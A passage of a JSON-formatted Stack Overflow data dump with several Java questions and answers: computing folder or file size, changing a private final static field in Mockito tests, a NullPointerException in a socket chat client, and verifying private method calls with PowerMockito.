&lt;/dependency&gt;\r\n\r\nIf not using Maven, add the following to class path\r\n\r\nhttps://repo1.maven.org/maven2/com/google/guava/guava/28.1-jre/guava-28.1-jre.jar\r\n\r\n\r\n  \r\n\r\n    public long getFolderSizeViaGuava() {\r\n            File folder = new File(&quot;src/test/resources&quot;);\r\n            Iterable&lt;File&gt; files = Files.fileTreeTraverser()\r\n                    .breadthFirstTraversal(folder);\r\n            long size = StreamSupport.stream(files.spliterator(), false)\r\n                    .filter(f -&gt; f.isFile())\r\n                    .mapToLong(File::length).sum();\r\n    \r\n            return  size;\r\n        }\r\n\r\nTo get file size,\r\n\r\n     File file = new File(&quot;PATH TO YOUR FILE&quot;);\r\n     long s  = file.length();\r\n     System.out.println(s);","title":"Get size of folder or file","body":"<p>You can use <code>Apache Commons IO</code> to find the folder size easily. </p>\n\n<p>If you are on maven, please add the following dependency in your <code>pom.xml</code> file.</p>\n\n<pre><code>&lt;!-- https://mvnrepository.com/artifact/commons-io/commons-io --&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;commons-io&lt;/groupId&gt;\n    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;\n    &lt;version&gt;2.6&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n\n<p>If not a fan of Maven, download the following jar and add it to the class path.</p>\n\n<p><a href=\"https://repo1.maven.org/maven2/commons-io/commons-io/2.6/commons-io-2.6.jar\" rel=\"nofollow noreferrer\">https://repo1.maven.org/maven2/commons-io/commons-io/2.6/commons-io-2.6.jar</a></p>\n\n<pre><code>public long getFolderSize() {\n\n    File folder = new File(\"src/test/resources\");\n    long size = FileUtils.sizeOfDirectory(folder);\n\n    return size; // in bytes\n}\n</code></pre>\n\n<p>To get file size via Commons IO,</p>\n\n<pre><code>File file = new File(\"ADD YOUR PATH TO FILE\");\n\nlong fileSize = FileUtils.sizeOf(file);\n\nSystem.out.println(fileSize); // bytes\n</code></pre>\n\n<p>It is also achievable via <code>Google Guava</code> </p>\n\n<p>For Maven, add the following:</p>\n\n<pre><code>&lt;!-- https://mvnrepository.com/artifact/com.google.guava/guava --&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;com.google.guava&lt;/groupId&gt;\n    &lt;artifactId&gt;guava&lt;/artifactId&gt;\n    &lt;version&gt;28.1-jre&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n\n<p>If not using Maven, add the following to class path</p>\n\n<p><a href=\"https://repo1.maven.org/maven2/com/google/guava/guava/28.1-jre/guava-28.1-jre.jar\" rel=\"nofollow noreferrer\">https://repo1.maven.org/maven2/com/google/guava/guava/28.1-jre/guava-28.1-jre.jar</a></p>\n\n<pre><code>public long getFolderSizeViaGuava() {\n        File folder = new File(\"src/test/resources\");\n        Iterable&lt;File&gt; files = Files.fileTreeTraverser()\n                .breadthFirstTraversal(folder);\n        long size = StreamSupport.stream(files.spliterator(), false)\n                .filter(f -&gt; f.isFile())\n                .mapToLong(File::length).sum();\n\n        return  size;\n    }\n</code></pre>\n\n<p>To get file size,</p>\n\n<pre><code> File file = new File(\"PATH TO YOUR FILE\");\n long s  = file.length();\n System.out.println(s);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":10661280,"reputation":39,"user_id":7849169,"display_name":"Jaskaran Singh"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1577175510,"creation_date":1577175510,"answer_id":59465843,"question_id":2149785,"body_markdown":"    private static long getFolderSize(Path folder) {\r\n    \t\ttry {\r\n    \t\t\treturn Files.walk(folder)\r\n    \t\t\t\t      .filter(p -&gt; p.toFile().isFile())\r\n    \t\t\t\t      .mapToLong(p -&gt; p.toFile().length())\r\n    \t\t\t\t      .sum();\r\n    \t\t} catch (IOException e) {\r\n    \t\t\te.printStackTrace();\r\n    \t\t\treturn 0L;\r\n    \t\t}","title":"Get size of folder or file","body":"<pre><code>private static long getFolderSize(Path folder) {\n        try {\n            return Files.walk(folder)\n                      .filter(p -&gt; p.toFile().isFile())\n                      .mapToLong(p -&gt; p.toFile().length())\n                      .sum();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return 0L;\n        }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":6721698,"reputation":89,"user_id":5281674,"display_name":"G Dias"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1589137874,"creation_date":1589137874,"answer_id":61717408,"question_id":2149785,"body_markdown":"I&#39;ve tested `du -c &lt;folderpath&gt;` and is 2x faster than nio.Files or recursion\r\n\r\n    private static long getFolderSize(File folder){\r\n      if (folder != null &amp;&amp; folder.exists() &amp;&amp; folder.canRead()){\r\n        try {\r\n          Process p = new ProcessBuilder(&quot;du&quot;,&quot;-c&quot;,folder.getAbsolutePath()).start();\r\n          BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\r\n          String total = &quot;&quot;;\r\n          for (String line; null != (line = r.readLine());)\r\n            total = line;\r\n          r.close();\r\n          p.waitFor();\r\n          if (total.length() &gt; 0 &amp;&amp; total.endsWith(&quot;total&quot;))\r\n            return Long.parseLong(total.split(&quot;\\\\s+&quot;)[0]) * 1024;\r\n        } catch (Exception ex) {\r\n          ex.printStackTrace();\r\n        }\r\n      }\r\n      return -1;\r\n    }","title":"Get size of folder or file","body":"<p>I've tested <code>du -c &lt;folderpath&gt;</code> and is 2x faster than nio.Files or recursion</p>\n\n<pre><code>private static long getFolderSize(File folder){\n  if (folder != null &amp;&amp; folder.exists() &amp;&amp; folder.canRead()){\n    try {\n      Process p = new ProcessBuilder(\"du\",\"-c\",folder.getAbsolutePath()).start();\n      BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n      String total = \"\";\n      for (String line; null != (line = r.readLine());)\n        total = line;\n      r.close();\n      p.waitFor();\n      if (total.length() &gt; 0 &amp;&amp; total.endsWith(\"total\"))\n        return Long.parseLong(total.split(\"\\\\s+\")[0]) * 1024;\n    } catch (Exception ex) {\n      ex.printStackTrace();\n    }\n  }\n  return -1;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":22422920,"reputation":31,"user_id":16629963,"display_name":"Kuldeep Rathod"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640263504,"creation_date":1640263504,"answer_id":70462311,"question_id":2149785,"body_markdown":"    fun getSize(context: Context, uri: Uri?): Float? {\r\n        var fileSize: String? = null\r\n        val cursor: Cursor? = context.contentResolver\r\n            .query(uri!!, null, null, null, null, null)\r\n        try {\r\n            if (cursor != null &amp;&amp; cursor.moveToFirst()) {\r\n\r\n                // get file size\r\n                val sizeIndex: Int = cursor.getColumnIndex(OpenableColumns.SIZE)\r\n                if (!cursor.isNull(sizeIndex)) {\r\n                    fileSize = cursor.getString(sizeIndex)\r\n                }\r\n            }\r\n        } finally {\r\n            cursor?.close()\r\n        }\r\n        return fileSize!!.toFloat() / (1024 * 1024)\r\n    }","title":"Get size of folder or file","body":"<pre><code>fun getSize(context: Context, uri: Uri?): Float? {\n    var fileSize: String? = null\n    val cursor: Cursor? = context.contentResolver\n        .query(uri!!, null, null, null, null, null)\n    try {\n        if (cursor != null &amp;&amp; cursor.moveToFirst()) {\n\n            // get file size\n            val sizeIndex: Int = cursor.getColumnIndex(OpenableColumns.SIZE)\n            if (!cursor.isNull(sizeIndex)) {\n                fileSize = cursor.getString(sizeIndex)\n            }\n        }\n    } finally {\n        cursor?.close()\n    }\n    return fileSize!!.toFloat() / (1024 * 1024)\n}\n</code></pre>\n"}],"owner":{"account_id":94293,"reputation":10816,"user_id":257530,"accept_rate":47,"display_name":"oneat"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":138937,"favorite_count":0,"down_vote_count":1,"up_vote_count":122,"accepted_answer_id":2149807,"answer_count":19,"score":121,"last_activity_date":1640263504,"creation_date":1264621481,"question_id":2149785,"body_markdown":"How can I retrieve size of folder or file in Java?","title":"Get size of folder or file","body":"<p>How can I retrieve size of folder or file in Java?</p>\n"},{"tags":["java","spring-boot","unit-testing","mockito","spring-test"],"answers":[{"tags":[],"owner":{"account_id":8712968,"reputation":312,"user_id":6518591,"display_name":"Abhinav Pandey"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640243458,"creation_date":1640243458,"answer_id":70458794,"question_id":70458677,"body_markdown":"Not sure if even Powermock will be able to help. \r\n\r\nThe recommended way is to not use inline constants which need to be changed while testing.\r\n- If you want to change this, you need to introduce an interface in between which supplies constants. Use one implementation of it for the actual source and one for tests. Switch the implementation while testing.\r\n\r\nIf you do not want to change this, you could try the below approach with reflection\r\n- Make the field accessible.\r\n- Remove the final modifier\r\n- edit the field value\r\n\r\nI got this suggestion from [this discussion](https://groups.google.com/g/powermock/c/kU1cTlco564)\r\n\r\n```java\r\nprivate static void setFinalStatic(Field field, Object newValue) throws Exception {\r\n   Field field = ClassWhereToMockStaticFinalVar.class.getDeclaredField(&quot;FieldName&quot;);   \r\n   field.setAccessible(true);\r\n \r\n   // remove final modifier from field\r\n   Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;);\r\n   modifiersField.setAccessible(true);\r\n   modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);\r\n   field.set(null, newValue);\r\n}\r\n```\r\n ","title":"Set value for private final static inlined variable using Mockito","body":"<p>Not sure if even Powermock will be able to help.</p>\n<p>The recommended way is to not use inline constants which need to be changed while testing.</p>\n<ul>\n<li>If you want to change this, you need to introduce an interface in between which supplies constants. Use one implementation of it for the actual source and one for tests. Switch the implementation while testing.</li>\n</ul>\n<p>If you do not want to change this, you could try the below approach with reflection</p>\n<ul>\n<li>Make the field accessible.</li>\n<li>Remove the final modifier</li>\n<li>edit the field value</li>\n</ul>\n<p>I got this suggestion from <a href=\"https://groups.google.com/g/powermock/c/kU1cTlco564\" rel=\"nofollow noreferrer\">this discussion</a></p>\n<pre class=\"lang-java prettyprint-override\"><code>private static void setFinalStatic(Field field, Object newValue) throws Exception {\n   Field field = ClassWhereToMockStaticFinalVar.class.getDeclaredField(&quot;FieldName&quot;);   \n   field.setAccessible(true);\n \n   // remove final modifier from field\n   Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;);\n   modifiersField.setAccessible(true);\n   modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);\n   field.set(null, newValue);\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":9443335,"reputation":15252,"user_id":7023245,"accept_rate":25,"display_name":"Timothy Truckle"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1640255720,"creation_date":1640255720,"answer_id":70460891,"question_id":70458677,"body_markdown":"You are trying to violate the *information hiding / encapsulation* principle because you are trying to &quot;test code&quot;.\r\n\r\nBut UnitTests do not &quot;test code&quot;.  \r\nUnit Tests verify *public observable* **behavior**, that is: *return values* and *communication with dependencies*.\r\n\r\nThe actual content of that constant is an *implementation detail* the Test should not care about.\r\n\r\nSo what you really should test is, that `verifyState()` returns `true` if the *request* contains a cookie with Name &quot;viaductLocalAmp&quot; and value &quot;Y&quot;.\r\n","title":"Set value for private final static inlined variable using Mockito","body":"<p>You are trying to violate the <em>information hiding / encapsulation</em> principle because you are trying to &quot;test code&quot;.</p>\n<p>But UnitTests do not &quot;test code&quot;.<br />\nUnit Tests verify <em>public observable</em> <strong>behavior</strong>, that is: <em>return values</em> and <em>communication with dependencies</em>.</p>\n<p>The actual content of that constant is an <em>implementation detail</em> the Test should not care about.</p>\n<p>So what you really should test is, that <code>verifyState()</code> returns <code>true</code> if the <em>request</em> contains a cookie with Name &quot;viaductLocalAmp&quot; and value &quot;Y&quot;.</p>\n"}],"owner":{"account_id":8915876,"reputation":3560,"user_id":6654475,"accept_rate":100,"display_name":"Francislainy Campos"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1879,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":70460891,"answer_count":2,"score":1,"last_activity_date":1640263257,"creation_date":1640242676,"question_id":70458677,"body_markdown":"I&#39;m trying to test a method which calls another method which makes use of a private final static variable initialized inline. I&#39;m then trying to change the value for the variable when the tests run. I&#39;ve been trying things such as spring reflection or adding a setter for that specific field but maybe I should use something as powermock, which I never used before. I&#39;m on my own trying to implement this with no one to ask so if I could have some guidance on what is the best way to proceed, please.\r\n\r\n**UPDATE**\r\n\r\nBased on some feedback I got here, mocking the private final variable may not be what I should do for my my tests. I&#39;ve opened a different issue here https://stackoverflow.com/questions/70462251/mock-return-value-for-cookie-getvalue-using-mockito\r\n\r\n\r\n    @Service\r\n    public class CookieSessionUtils {\r\n\r\n    private static final String VIADUCT_LOCAL_AMP = &quot;viaductLocalAmp&quot;; // Value to be changed when the test runs to test the &quot;if Y&quot; scenario.\r\n\r\n\r\n    public boolean verifyState(HttpServletRequest request, String state) {\r\n\r\n        String viaductLocalAmp = getCookieByName(request, VIADUCT_LOCAL_AMP); \r\n\r\n        if (viaductLocalAmp.equalsIgnoreCase(&quot;Y&quot;)) {\r\n            return true;\r\n        }\r\n\r\n        return false;\r\n    }\r\n\r\n    public String getCookieByName(HttpServletRequest request, String cookieName) {\r\n        try {\r\n            Cookie[] cookies = request.getCookies();\r\n            if (cookies != null) {\r\n                for (Cookie cookie : cookies) {\r\n                    if (cookie.getName().equals(cookieName)) {\r\n                        return cookie.getValue();\r\n                    }\r\n                }\r\n            }\r\n        } catch (Exception e) {\r\n            ExceptionLogger.logDetailedError(&quot;CookieSessionUtils.getCookieByName&quot;, e);\r\n            log.error(&quot;Error on Cookie &quot; + e.getMessage());\r\n        }\r\n        return &quot;&quot;;\r\n    }\r\n\r\n\r\nThese are a few of the things I&#39;ve tried:\r\n\r\n    @Autowired\r\n    private CookieSessionUtils cookieSessionUtils;\r\n\r\n    @Mock\r\n    private HttpServletRequest request;\r\n\r\n    @Test\r\n    public void testVerifyState() {\r\n\r\n        Cookie mockCookie = Mockito.mock(Cookie.class);\r\n        Mockito.when(mockCookie.getName()).thenReturn(&quot;YviaductLocalAmp&quot;);\r\n\r\n        Mockito.when(request.getCookies()).thenReturn(new Cookie[]{mockCookie});\r\n\r\n    //  cookieSessionUtils.setViaductLocalAmp(&quot;YviaductLocalAmp&quot;);\r\n\r\n    //  setField(cookieSessionUtils, &quot;VIADUCT_LOCAL_AMP&quot;, VIADUCT_LOCAL_AMP);\r\n\r\n    //  Mockito.when(cookieSessionUtils.getCookieByName(request, &quot;YviaductLocalAmp&quot;)).thenReturn(&quot;Y&quot;);\r\n\r\n        assertTrue(cookieSessionUtils.verifyState(httpServletRequest, &quot;viaductLocalAmp&quot;));\r\n\r\n    }\r\n\r\nThank you.\r\n\r\n","title":"Set value for private final static inlined variable using Mockito","body":"<p>I'm trying to test a method which calls another method which makes use of a private final static variable initialized inline. I'm then trying to change the value for the variable when the tests run. I've been trying things such as spring reflection or adding a setter for that specific field but maybe I should use something as powermock, which I never used before. I'm on my own trying to implement this with no one to ask so if I could have some guidance on what is the best way to proceed, please.</p>\n<p><strong>UPDATE</strong></p>\n<p>Based on some feedback I got here, mocking the private final variable may not be what I should do for my my tests. I've opened a different issue here <a href=\"https://stackoverflow.com/questions/70462251/mock-return-value-for-cookie-getvalue-using-mockito\">Mock return value for cookie.getValue() using Mockito</a></p>\n<pre><code>@Service\npublic class CookieSessionUtils {\n\nprivate static final String VIADUCT_LOCAL_AMP = &quot;viaductLocalAmp&quot;; // Value to be changed when the test runs to test the &quot;if Y&quot; scenario.\n\n\npublic boolean verifyState(HttpServletRequest request, String state) {\n\n    String viaductLocalAmp = getCookieByName(request, VIADUCT_LOCAL_AMP); \n\n    if (viaductLocalAmp.equalsIgnoreCase(&quot;Y&quot;)) {\n        return true;\n    }\n\n    return false;\n}\n\npublic String getCookieByName(HttpServletRequest request, String cookieName) {\n    try {\n        Cookie[] cookies = request.getCookies();\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (cookie.getName().equals(cookieName)) {\n                    return cookie.getValue();\n                }\n            }\n        }\n    } catch (Exception e) {\n        ExceptionLogger.logDetailedError(&quot;CookieSessionUtils.getCookieByName&quot;, e);\n        log.error(&quot;Error on Cookie &quot; + e.getMessage());\n    }\n    return &quot;&quot;;\n}\n</code></pre>\n<p>These are a few of the things I've tried:</p>\n<pre><code>@Autowired\nprivate CookieSessionUtils cookieSessionUtils;\n\n@Mock\nprivate HttpServletRequest request;\n\n@Test\npublic void testVerifyState() {\n\n    Cookie mockCookie = Mockito.mock(Cookie.class);\n    Mockito.when(mockCookie.getName()).thenReturn(&quot;YviaductLocalAmp&quot;);\n\n    Mockito.when(request.getCookies()).thenReturn(new Cookie[]{mockCookie});\n\n//  cookieSessionUtils.setViaductLocalAmp(&quot;YviaductLocalAmp&quot;);\n\n//  setField(cookieSessionUtils, &quot;VIADUCT_LOCAL_AMP&quot;, VIADUCT_LOCAL_AMP);\n\n//  Mockito.when(cookieSessionUtils.getCookieByName(request, &quot;YviaductLocalAmp&quot;)).thenReturn(&quot;Y&quot;);\n\n    assertTrue(cookieSessionUtils.verifyState(httpServletRequest, &quot;viaductLocalAmp&quot;));\n\n}\n</code></pre>\n<p>Thank you.</p>\n"},{"tags":["java"],"comments":[{"owner":{"account_id":8362430,"reputation":856,"user_id":6280255,"display_name":"Just another Java programmer"},"score":0,"creation_date":1640261988,"post_id":70462011,"comment_id":124555583,"body_markdown":"You are not assigning  the username  member field anywhere.  You are just passing it as a parameter","body":"You are not assigning  the username  member field anywhere.  You are just passing it as a parameter"},{"owner":{"account_id":18994381,"reputation":146,"user_id":13862869,"display_name":"Kavishka Madhushan"},"score":1,"creation_date":1640263054,"post_id":70462011,"comment_id":124555928,"body_markdown":"It&#39;s a null point exception. you pass username to the constructor. But you forgot to assign it to the  &quot;username&quot;  in your Client Class","body":"It&#39;s a null point exception. you pass username to the constructor. But you forgot to assign it to the  &quot;username&quot;  in your Client Class"}],"owner":{"account_id":23428067,"reputation":69,"user_id":17487303,"display_name":"LearningFlutterDev"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":31,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"closed_date":1640263408,"answer_count":0,"score":0,"last_activity_date":1640262918,"creation_date":1640261574,"question_id":70462011,"body_markdown":"I&#39;m trying to build a Server/Multiple clients chat app in Java that can handle muliple clients and build connection between them.\r\nI&#39;m facing this problem whenever I run the app on my terminal.\r\nAfter entering the name of the client (whether it&#39;s 1 client or multiple) , the client terminal gives me an error but in server side everything works fine and says that new client is connected.\r\n\r\nThis my `client.java`:\r\n    \r\n    public class Client {\r\n    \r\n        private Socket socket;\r\n        private BufferedWriter bufferedWriter;\r\n        private BufferedReader bufferedReader;\r\n        public String username;\r\n    \r\n        public Client(Socket socket, String username) {\r\n            try {\r\n                this.socket = socket;\r\n                this.bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\r\n                this.bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\r\n                \r\n            } catch (IOException e) {\r\n                closeEverything(socket, bufferedReader,bufferedWriter);\r\n                //TODO: handle exception\r\n            }\r\n        }\r\n    \r\n        public void sendMessage(){\r\n            try {\r\n                bufferedWriter.write(username);\r\n                bufferedWriter.newLine();\r\n                bufferedWriter.flush();\r\n    \r\n                Scanner scanner = new Scanner(System.in);\r\n                while(socket.isConnected()){\r\n                    String messagetoSend = scanner.nextLine();\r\n                    bufferedWriter.write(username+&quot;:&quot;+messagetoSend);\r\n                    bufferedWriter.newLine();\r\n                    bufferedWriter.flush();\r\n                }\r\n            }catch (IOException e){\r\n                closeEverything(socket, bufferedReader,bufferedWriter);\r\n            }\r\n        }\r\n    \r\n        public void listenForMessage(){\r\n    \r\n            new Thread(new Runnable(){\r\n                @Override\r\n                public void run(){\r\n                    String messageFromGroupe;\r\n                    while(socket.isConnected()){\r\n                        try {\r\n                            messageFromGroupe = bufferedReader.readLine();\r\n                        } catch (IOException e) {\r\n                            closeEverything(socket, bufferedReader,bufferedWriter);\r\n                        }\r\n                    }\r\n                }\r\n            }).start();\r\n        }  \r\n    \r\n        public void closeEverything(Socket socket, BufferedReader bufferedReader,BufferedWriter bufferedWriter){\r\n            try{\r\n                if(bufferedReader != null){\r\n                    bufferedReader.close();\r\n                }\r\n                if(bufferedWriter!=null){\r\n                    bufferedWriter.close();\r\n                }\r\n                if(socket != null){\r\n                    socket.close();\r\n                }\r\n            }catch(IOException e){\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n        public static void main(String[] args) throws UnknownHostException, IOException {\r\n            Scanner scanner = new Scanner(System.in);\r\n            System.out.println(&quot;Votre Nom :&quot;);\r\n            String username = scanner.next();\r\n            Socket socket = new Socket(&quot;localhost&quot;,1234);\r\n            Client client = new Client(socket, username);\r\n            client.listenForMessage();\r\n            client.sendMessage();\r\n        }\r\n    }\r\n\r\nand the error i&#39;m getting just after entering my username (VotreNom): \r\n\r\n    Exception in thread &quot;main&quot; java.lang.NullPointerException: Cannot invoke &quot;String.length()&quot; because &quot;str&quot; is null\r\n    at java.base/java.io.Writer.write(Writer.java:249)\r\n    at Client.sendMessage(Client.java:31)\r\n    at Client.main(Client.java:86)","title":"Error in when entering Client name in Java","body":"<p>I'm trying to build a Server/Multiple clients chat app in Java that can handle muliple clients and build connection between them.\nI'm facing this problem whenever I run the app on my terminal.\nAfter entering the name of the client (whether it's 1 client or multiple) , the client terminal gives me an error but in server side everything works fine and says that new client is connected.</p>\n<p>This my <code>client.java</code>:</p>\n<pre><code>public class Client {\n\n    private Socket socket;\n    private BufferedWriter bufferedWriter;\n    private BufferedReader bufferedReader;\n    public String username;\n\n    public Client(Socket socket, String username) {\n        try {\n            this.socket = socket;\n            this.bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n            this.bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            \n        } catch (IOException e) {\n            closeEverything(socket, bufferedReader,bufferedWriter);\n            //TODO: handle exception\n        }\n    }\n\n    public void sendMessage(){\n        try {\n            bufferedWriter.write(username);\n            bufferedWriter.newLine();\n            bufferedWriter.flush();\n\n            Scanner scanner = new Scanner(System.in);\n            while(socket.isConnected()){\n                String messagetoSend = scanner.nextLine();\n                bufferedWriter.write(username+&quot;:&quot;+messagetoSend);\n                bufferedWriter.newLine();\n                bufferedWriter.flush();\n            }\n        }catch (IOException e){\n            closeEverything(socket, bufferedReader,bufferedWriter);\n        }\n    }\n\n    public void listenForMessage(){\n\n        new Thread(new Runnable(){\n            @Override\n            public void run(){\n                String messageFromGroupe;\n                while(socket.isConnected()){\n                    try {\n                        messageFromGroupe = bufferedReader.readLine();\n                    } catch (IOException e) {\n                        closeEverything(socket, bufferedReader,bufferedWriter);\n                    }\n                }\n            }\n        }).start();\n    }  \n\n    public void closeEverything(Socket socket, BufferedReader bufferedReader,BufferedWriter bufferedWriter){\n        try{\n            if(bufferedReader != null){\n                bufferedReader.close();\n            }\n            if(bufferedWriter!=null){\n                bufferedWriter.close();\n            }\n            if(socket != null){\n                socket.close();\n            }\n        }catch(IOException e){\n            e.printStackTrace();\n        }\n    }\n    public static void main(String[] args) throws UnknownHostException, IOException {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(&quot;Votre Nom :&quot;);\n        String username = scanner.next();\n        Socket socket = new Socket(&quot;localhost&quot;,1234);\n        Client client = new Client(socket, username);\n        client.listenForMessage();\n        client.sendMessage();\n    }\n}\n</code></pre>\n<p>and the error i'm getting just after entering my username (VotreNom):</p>\n<pre><code>Exception in thread &quot;main&quot; java.lang.NullPointerException: Cannot invoke &quot;String.length()&quot; because &quot;str&quot; is null\nat java.base/java.io.Writer.write(Writer.java:249)\nat Client.sendMessage(Client.java:31)\nat Client.main(Client.java:86)\n</code></pre>\n"},{"tags":["java","mockito","powermockito","spy"],"comments":[{"owner":{"account_id":108033,"reputation":17201,"user_id":286934,"display_name":"Progman"},"score":0,"creation_date":1640202099,"post_id":70452720,"comment_id":124542273,"body_markdown":"Does this answer your question? [Powermock verify private static method call in non static method](https://stackoverflow.com/questions/16515809/powermock-verify-private-static-method-call-in-non-static-method)","body":"Does this answer your question? <a href=\"https://stackoverflow.com/questions/16515809/powermock-verify-private-static-method-call-in-non-static-method\">Powermock verify private static method call in non static method</a>"}],"answers":[{"tags":[],"owner":{"account_id":290683,"reputation":12512,"user_id":592355,"display_name":"xerx593"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640262902,"creation_date":1640202500,"answer_id":70454391,"question_id":70452720,"body_markdown":"The problem could be &lt;s&gt;is&lt;/s&gt;, that:\r\n\r\n    .invoke(&quot;privateMethod&quot;)\r\n\r\ncan be interpreted as:\r\n\r\n1. `void invoke(String methodToVerify, Object... arguments)` [javadoc](https://www.javadoc.io/static/org.powermock/powermock-api-mockito/1.6.5/org/powermock/api/mockito/verification/PrivateMethodVerification.html#invoke-java.lang.String-java.lang.Object...-), which we (obviously) want. Or\r\n2. `void invoke(Object... arguments)` [javadoc](https://www.javadoc.io/static/org.powermock/powermock-api-mockito/1.6.5/org/powermock/api/mockito/verification/PrivateMethodVerification.html#invoke-java.lang.Object...-), which is different and discovers the (private) method not by name, but by &quot;arguments&quot;.\r\n\r\nSo a solution could be (to avoid incorrect overload):\r\n\r\n    .invoke(&quot;privateMethod&quot;, new Object[0]) // which still *could* be \r\n       // confused with Object... but I &quot;hope&quot; the String in front saves us!:)\r\n    // if this works: .invoke(&quot;privateMethod&quot;, null) should also work.\r\n\r\nOr to use one of the alternatives corerctly.#\r\n\r\n\r\n----------\r\nBut this is *often* the problem with &quot;overloaded libs&quot; ... varargs makes things even worse/potentially in-deterministic! :-)\r\n\r\n","title":"PowerMockito verifyTimes Always passets private method","body":"<p>The problem could be <s>is</s>, that:</p>\n<pre><code>.invoke(&quot;privateMethod&quot;)\n</code></pre>\n<p>can be interpreted as:</p>\n<ol>\n<li><code>void invoke(String methodToVerify, Object... arguments)</code> <a href=\"https://www.javadoc.io/static/org.powermock/powermock-api-mockito/1.6.5/org/powermock/api/mockito/verification/PrivateMethodVerification.html#invoke-java.lang.String-java.lang.Object...-\" rel=\"nofollow noreferrer\">javadoc</a>, which we (obviously) want. Or</li>\n<li><code>void invoke(Object... arguments)</code> <a href=\"https://www.javadoc.io/static/org.powermock/powermock-api-mockito/1.6.5/org/powermock/api/mockito/verification/PrivateMethodVerification.html#invoke-java.lang.Object...-\" rel=\"nofollow noreferrer\">javadoc</a>, which is different and discovers the (private) method not by name, but by &quot;arguments&quot;.</li>\n</ol>\n<p>So a solution could be (to avoid incorrect overload):</p>\n<pre><code>.invoke(&quot;privateMethod&quot;, new Object[0]) // which still *could* be \n   // confused with Object... but I &quot;hope&quot; the String in front saves us!:)\n// if this works: .invoke(&quot;privateMethod&quot;, null) should also work.\n</code></pre>\n<p>Or to use one of the alternatives corerctly.#</p>\n<hr />\n<p>But this is <em>often</em> the problem with &quot;overloaded libs&quot; ... varargs makes things even worse/potentially in-deterministic! :-)</p>\n"},{"tags":[],"owner":{"account_id":5866524,"reputation":61,"user_id":4620292,"display_name":"STSISA"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640261405,"creation_date":1640261405,"answer_id":70461974,"question_id":70452720,"body_markdown":"It seems as if I need to include the @PrepareForTest annotation in this particular test to make it work. Now the test fails which it was supposed to do. Also - it works when I change to Mockito.times(1).\r\n\r\n    @RunWith(PowerMockRunner.class)\r\n    @PowerMockIgnore(&quot;javax.management.*&quot;)\r\n    @PrepareForTest(TestedClass.class) // &lt;--- I didn&#39;t include this in the question\r\n    public class TestedClassTest\r\n    {\r\n        \r\n        @Before\r\n        public void setUp()\r\n        {\r\n        }\r\n        \r\n        @Test\r\n        public void testPrivateMethodCalledOnce() throws Exception \r\n        {\r\n            TestedClass spy = PowerMockito.spy(new TestedClass());\r\n            spy.publicMethod();\r\n            \r\n            PowerMockito.verifyPrivate(spy, Mockito.times(1)).invoke(&quot;privateMethod&quot;); \r\n        }\r\n    }\r\n\r\n","title":"PowerMockito verifyTimes Always passets private method","body":"<p>It seems as if I need to include the @PrepareForTest annotation in this particular test to make it work. Now the test fails which it was supposed to do. Also - it works when I change to Mockito.times(1).</p>\n<pre><code>@RunWith(PowerMockRunner.class)\n@PowerMockIgnore(&quot;javax.management.*&quot;)\n@PrepareForTest(TestedClass.class) // &lt;--- I didn't include this in the question\npublic class TestedClassTest\n{\n    \n    @Before\n    public void setUp()\n    {\n    }\n    \n    @Test\n    public void testPrivateMethodCalledOnce() throws Exception \n    {\n        TestedClass spy = PowerMockito.spy(new TestedClass());\n        spy.publicMethod();\n        \n        PowerMockito.verifyPrivate(spy, Mockito.times(1)).invoke(&quot;privateMethod&quot;); \n    }\n}\n</code></pre>\n"}],"owner":{"account_id":5866524,"reputation":61,"user_id":4620292,"display_name":"STSISA"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":271,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":2,"score":2,"last_activity_date":1640262902,"creation_date":1640193247,"question_id":70452720,"body_markdown":"    public class TestedClass\r\n    {\r\n    \t\r\n    \tpublic void publicMethod() \r\n    \t{\r\n    \t\tprivateMethod();\r\n    \t}\r\n    \t\r\n    \tprivate void privateMethod() \r\n    \t{\r\n    \t}\r\n    }\r\n\r\nI would like to test with PowerMockito that the private method is called exactly once.\r\n\r\nHere&#39;s my test class:\r\n\r\n    @RunWith(PowerMockRunner.class)\r\n    